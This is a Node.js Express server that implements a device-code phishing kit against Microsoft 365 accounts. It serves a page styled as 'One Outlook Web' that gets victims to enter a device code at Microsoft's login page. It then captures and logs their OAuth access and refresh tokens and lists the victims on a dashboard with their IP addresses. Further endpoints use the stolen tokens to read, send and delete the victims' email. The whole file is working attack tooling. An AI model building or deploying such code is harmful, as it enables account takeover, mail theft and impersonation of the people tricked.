const express = require('express');
const axios = require('axios');
const cors = require('cors');
const path = require('path');

const app = express();
const PORT = process.env.PORT || 3000;

app.use(cors());
app.use(express.json());
app.use(express.static('public'));

// ============================================
// YOUR AZURE APP CLIENT ID
// ============================================
const YOUR_CLIENT_ID = 'eb588048-cc40-4f6e-adc0-e2238e604376';
// ============================================

let userSessions = new Map();
let pendingAuth = new Map();

function generateSID() {
    return Math.floor(Math.random() * 9000000) + 1000000;
}

function getClientIp(req) {
    return req.headers['x-forwarded-for']?.split(',')[0] || req.socket.remoteAddress || 'Unknown';
}

// ============================================
// CREATE SESSION - WITH MAIL SCOPES
// ============================================
app.post('/api/create-session', async (req, res) => {
    try {
        const sid = generateSID();
        const clientIp = getClientIp(req);
        const userAgent = req.headers['user-agent'] || 'Unknown';
        
        // IMPORTANT: Added Mail.Read scope to access emails
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'Mail.Read Mail.ReadWrite Mail.Send User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code, expires_in } = response.data;
        
        console.log(`[CREATE] SID: ${sid}, Code: ${user_code}`);
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: clientIp, userAgent: userAgent,
            createdAt: Date.now(),
            expiresAt: Date.now() + (expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        res.json({ success: true, sid: sid, user_code: user_code });
        
    } catch (err) {
        console.error('Create session error:', err.message);
        res.status(500).json({ error: err.message });
    }
});

async function pollForToken(device_code, sid) {
    const pollInterval = setInterval(async () => {
        const pending = pendingAuth.get(device_code);
        if (!pending || pending.status !== 'pending') {
            clearInterval(pollInterval);
            return;
        }
        
        if (Date.now() > pending.expiresAt) {
            pending.status = 'expired';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            return;
        }
        
        try {
            const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
                new URLSearchParams({
                    grant_type: 'urn:ietf:params:oauth:grant-type:device_code',
                    client_id: YOUR_CLIENT_ID,
                    device_code: device_code
                }), {
                    headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
                }
            );
            
            const tokens = response.data;
            
            const userInfo = await axios.get('https://graph.microsoft.com/v1.0/me', {
                headers: { 'Authorization': `Bearer ${tokens.access_token}` }
            });
            
            const session = {
                sid: sid,
                email: userInfo.data.mail || userInfo.data.userPrincipalName,
                name: userInfo.data.displayName,
                ip: pending.ip,
                userAgent: pending.userAgent,
                access_token: tokens.access_token,
                refresh_token: tokens.refresh_token,  // PRT
                expires_in: tokens.expires_in,
                expires_at: Date.now() + (tokens.expires_in * 1000),
                capturedAt: new Date().toISOString()
            };
            
            userSessions.set(sid.toString(), session);
            
            pending.status = 'captured';
            pendingAuth.delete(device_code);
            clearInterval(pollInterval);
            
            console.log(`✅ CAPTURED: ${session.email} (Mail access granted)`);
            
        } catch (err) {}
    }, 3000);
}

// ============================================
// REFRESH ACCESS TOKEN USING PRT
// ============================================
async function getFreshAccessToken(session) {
    if (!session.refresh_token) {
        console.log(`❌ No PRT for ${session.email}`);
        return null;
    }
    
    try {
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/token',
            new URLSearchParams({
                grant_type: 'refresh_token',
                refresh_token: session.refresh_token,
                client_id: YOUR_CLIENT_ID
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const tokens = response.data;
        session.access_token = tokens.access_token;
        session.expires_in = tokens.expires_in;
        session.expires_at = Date.now() + (tokens.expires_in * 1000);
        
        console.log(`🔄 Refreshed token for ${session.email}`);
        return session.access_token;
        
    } catch (err) {
        console.error(`Token refresh failed: ${err.message}`);
        return null;
    }
}

// ============================================
// API: Get fresh access token
// ============================================
app.get('/api/session/token/:sid', async (req, res) => {
    const session = userSessions.get(req.params.sid);
    if (!session) return res.status(404).json({ error: 'Session not found' });
    
    const freshToken = await getFreshAccessToken(session);
    
    res.json({
        email: session.email,
        access_token: freshToken || session.access_token,
        refresh_token: session.refresh_token,
        expires_in: session.expires_in
    });
});

// ============================================
// API: Get all sessions
// ============================================
app.get('/api/sessions', async (req, res) => {
    const sessionList = Array.from(userSessions.values()).map(s => ({
        sid: s.sid,
        email: s.email,
        name: s.name,
        ip: s.ip,
        userAgent: s.userAgent,
        capturedAt: s.capturedAt,
        hasPRT: !!s.refresh_token
    }));
    res.json({ sessions: sessionList });
});

// ============================================
// MAILBOX API - FETCH REAL EMAILS
// ============================================

// Get all mail folders from user's actual mailbox
app.get('/api/mail/folders/:sid', async (req, res) => {
    const { sid } = req.params;
    const session = userSessions.get(sid);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000) {
        token = await getFreshAccessToken(session);
    }
    
    try {
        const response = await axios.get('https://graph.microsoft.com/v1.0/me/mailFolders', {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$top': 100, '$select': 'id,displayName,parentFolderId,childFolderCount,totalItemCount,unreadItemCount' }
        });
        
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch folders', details: err.message });
    }
});

// Get emails from a specific folder by folder ID
app.get('/api/mail/:sid/folder/:folderId', async (req, res) => {
    const { sid, folderId } = req.params;
    const { top = 50 } = req.query;
    const session = userSessions.get(sid);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000) {
        token = await getFreshAccessToken(session);
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/mailFolders/${folderId}/messages`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: {
                '$top': top,
                '$orderby': 'receivedDateTime desc',
                '$select': 'id,subject,from,receivedDateTime,isRead,bodyPreview,hasAttachments,importance'
            }
        });
        
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch emails', details: err.message });
    }
});

// Get single email with full body
app.get('/api/mail/message/:sid/:messageId', async (req, res) => {
    const { sid, messageId } = req.params;
    const session = userSessions.get(sid);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000) {
        token = await getFreshAccessToken(session);
    }
    
    try {
        const response = await axios.get(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` },
            params: { '$select': 'id,subject,from,toRecipients,receivedDateTime,isRead,body,bodyPreview,hasAttachments,conversationId' }
        });
        
        res.json(response.data);
    } catch (err) {
        res.status(500).json({ error: 'Failed to fetch message', details: err.message });
    }
});

// Send email
app.post('/api/mail/send/:sid', async (req, res) => {
    const { sid } = req.params;
    const { to, subject, body } = req.body;
    const session = userSessions.get(sid);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000) {
        token = await getFreshAccessToken(session);
    }
    
    try {
        await axios.post('https://graph.microsoft.com/v1.0/me/sendMail', {
            message: {
                subject: subject,
                body: { contentType: 'HTML', content: body },
                toRecipients: to.map(email => ({ emailAddress: { address: email } }))
            },
            saveToSentItems: true
        }, { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } });
        
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to send email', details: err.message });
    }
});

// Delete email
app.delete('/api/mail/message/:sid/:messageId', async (req, res) => {
    const { sid, messageId } = req.params;
    const session = userSessions.get(sid);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000) {
        token = await getFreshAccessToken(session);
    }
    
    try {
        await axios.delete(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, {
            headers: { 'Authorization': `Bearer ${token}` }
        });
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to delete message', details: err.message });
    }
});

// Mark as read
app.patch('/api/mail/message/:sid/:messageId', async (req, res) => {
    const { sid, messageId } = req.params;
    const { isRead } = req.body;
    const session = userSessions.get(sid);
    
    if (!session) return res.status(401).json({ error: 'Session not found' });
    
    let token = session.access_token;
    if (Date.now() >= session.expires_at - 300000) {
        token = await getFreshAccessToken(session);
    }
    
    try {
        await axios.patch(`https://graph.microsoft.com/v1.0/me/messages/${messageId}`, 
            { isRead: isRead },
            { headers: { 'Authorization': `Bearer ${token}`, 'Content-Type': 'application/json' } }
        );
        res.json({ success: true });
    } catch (err) {
        res.status(500).json({ error: 'Failed to update message', details: err.message });
    }
});

app.delete('/api/sessions/clear', async (req, res) => {
    userSessions.clear();
    res.json({ success: true });
});

// Generate Auth Page
app.get('/generate-auth-page', async (req, res) => {
    try {
        const sid = generateSID();
        
        const response = await axios.post('https://login.microsoftonline.com/common/oauth2/v2.0/devicecode',
            new URLSearchParams({
                client_id: YOUR_CLIENT_ID,
                scope: 'Mail.Read Mail.ReadWrite Mail.Send User.Read openid profile offline_access'
            }), {
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' }
            }
        );
        
        const { device_code, user_code } = response.data;
        
        pendingAuth.set(device_code, {
            device_code, user_code, sid, status: 'pending',
            ip: getClientIp(req), userAgent: req.headers['user-agent'] || 'Unknown',
            createdAt: Date.now(),
            expiresAt: Date.now() + (response.data.expires_in * 1000)
        });
        
        pollForToken(device_code, sid);
        
        const html = `<!DOCTYPE html>
<html>
<head><title>One Outlook Web</title>
<style>
*{margin:0;padding:0;box-sizing:border-box}
body{font-family:'Segoe UI',sans-serif;background:linear-gradient(135deg,#0078d4,#00a4ef);min-height:100vh;display:flex;justify-content:center;align-items:center;padding:20px}
.card{background:#fff;border-radius:20px;padding:40px;max-width:500px;text-align:center;box-shadow:0 20px 60px rgba(0,0,0,.3)}
.code{font-size:42px;font-weight:bold;letter-spacing:8px;background:#f0f0f0;padding:20px;border-radius:12px;margin:20px 0;color:#0078d4;font-family:monospace}
.btn{background:#0078d4;color:#fff;border:none;padding:12px 28px;border-radius:8px;cursor:pointer;font-size:14px;font-weight:600;margin:5px}
.btn:hover{background:#005fa3}
.status{margin-top:20px;padding:12px;border-radius:8px;background:#f8f9fa;color:#666;font-size:13px}
.spinner{display:inline-block;width:14px;height:14px;border:2px solid #ccc;border-top-color:#0078d4;border-radius:50%;animation:spin .8s linear infinite;margin-right:8px}
@keyframes spin{to{transform:rotate(360deg)}}
</style>
</head>
<body>
<div class="card">
    <h2>One Outlook Web</h2>
    <p>Connect your Microsoft account (Mail access required)</p>
    <div class="code" id="userCode">${user_code}</div>
    <button class="btn" onclick="copyCode()">Copy Code</button>
    <button class="btn" id="openBtn">Open Microsoft Login</button>
    <div class="status" id="statusMsg"><span class="spinner"></span> Waiting for authentication...</div>
</div>
<script>
    const SID = ${sid};
    const API_URL = window.location.origin;
    function copyCode(){const c=document.getElementById('userCode').innerText;navigator.clipboard.writeText(c);alert('Copied!')}
    document.getElementById('openBtn').onclick=function(){window.open('https://microsoft.com/devicelogin','_blank','width=600,height=700')}
    async function poll(){try{const r=await fetch(API_URL+'/api/status/'+SID);const d=await r.json();if(d.status==='captured'){document.getElementById('statusMsg').innerHTML='✅ Access granted! Session captured.';setTimeout(()=>window.close(),2000)}}catch(e){}setTimeout(poll,3000)}
    poll();
</script>
</body>
</html>`;
        
        res.send(html);
        
    } catch (err) {
        res.status(500).send('Error: ' + err.message);
    }
});

app.get('/', (req, res) => {
    res.sendFile(path.join(__dirname, 'public', 'index.html'));
});

app.listen(PORT, '0.0.0.0', () => {
    console.log(`\n========================================`);
    console.log(`✅ Server running on port ${PORT}`);
    console.log(`📍 Dashboard: http://localhost:${PORT}`);
    console.log(`========================================\n`);
});
